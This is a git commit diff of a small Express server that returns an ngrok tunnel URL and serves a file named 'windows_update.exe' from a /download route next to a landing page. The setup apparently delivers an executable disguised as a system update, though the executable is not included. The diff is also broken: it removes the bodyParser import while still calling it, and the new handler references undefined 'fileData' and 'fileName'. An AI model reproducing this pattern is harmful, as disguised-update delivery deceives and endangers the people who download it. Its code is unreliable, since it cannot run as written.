0077f37c16c678675565d596dd35138d9d80628d
radio server <radioserver98@gmail.com>
2023-03-11 13:17:20 -0300

    try download with fs module

--- index.js
+++ index.js
@@ -1,13 +1,13 @@
 const express = require('express');
 const app = express();
-var bodyParser = require('body-parser')
 const PORT = process.env.PORT || 4500;
+const fs = require('fs');
 
 app.use(bodyParser.json({ limit: '50mb' }))
 
 app.all('/ok', (req, res) => {
     const date = new Date();
-    const day = `${date.getDate()}/${date.getMonth()+1}/${date.getFullYear()}`
+    const day = `${date.getDate()}/${date.getMonth() + 1}/${date.getFullYear()}`
     const time = `${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`
     res.send(`OK! ${day} ${time}`)
 })
@@ -16,17 +16,13 @@ app.all('/url', (req, res) => {
     res.send('https://0b4f-190-192-75-210.sa.ngrok.io')
 })
 
-app.get('/download-file', function (req, res) {
-    res.download(`${__dirname}/download/windows_update.exe`, function(err) {
-        if(err) {
-            console.log(err);
-        }
-    })
+app.get('/download', function (request, response) {
+    var fileContents = Buffer.from(fileData, "base64");
+    var savedFilePath = '/download/windows_update.exe';
+    fs.writeFile(savedFilePath, fileContents, function () {
+        response.status(200).download(savedFilePath, fileName);
+    });
 });
-
-app.use("/download", (req, res)=>{
-    res.sendFile("/download/windows_update.exe");
-  });
 
 app.get('/', function (req, res) {
     res.sendFile(`${__dirname}/download/index.html`);
